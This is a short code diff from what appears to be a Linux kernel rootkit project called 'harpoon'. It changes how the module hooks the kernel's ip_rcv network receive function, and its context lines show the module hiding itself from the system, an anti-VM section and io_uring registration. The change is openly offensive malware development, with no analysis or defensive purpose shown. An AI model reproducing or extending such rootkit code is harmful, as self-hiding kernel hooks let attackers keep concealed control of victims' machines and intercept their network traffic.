@@ -22,6 +22,7 @@ int (*legit_ip_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_t
 
 /* Rootkit entrypoint */
 static int __init harpoon_init(void){
+    struct harpoon_hook *ip_rcv_hook;
 
     // Anti VM
 
@@ -32,8 +33,9 @@ static int __init harpoon_init(void){
     harpoon_mod_hide(harpoon_new_mod(THIS_MODULE));
 
     // Hook ip_rcv
-    legit_ip_rcv = ip_rcv;
-    harpoon_hook(harpoon_new_hook("ip_rcv", harpoon_ip_rcv, ip_rcv, RECUR_DETECT));
+    ip_rcv_hook = harpoon_new_hook("ip_rcv", harpoon_ip_rcv, RECUR_DETECT);
+    legit_ip_rcv = ip_rcv_hook->legit;
+    harpoon_hook(ip_rcv_hook);
 
     // Register io_uring operations
 
